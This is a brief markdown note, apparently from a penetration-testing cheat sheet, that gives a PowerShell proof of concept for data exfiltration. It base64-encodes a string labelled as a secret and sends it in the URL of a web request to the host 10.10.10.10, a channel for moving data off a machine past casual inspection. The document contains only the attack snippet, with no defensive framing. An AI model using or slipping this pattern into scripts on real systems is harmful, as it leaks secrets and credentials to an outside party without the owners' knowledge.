# powershell
## simple base64 encoded web request proof of concept
```
$Text = ‘This is a secret and should be hidden’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
Invoke-WebRequest -Uri http://10.10.10.10/$EncodedText
```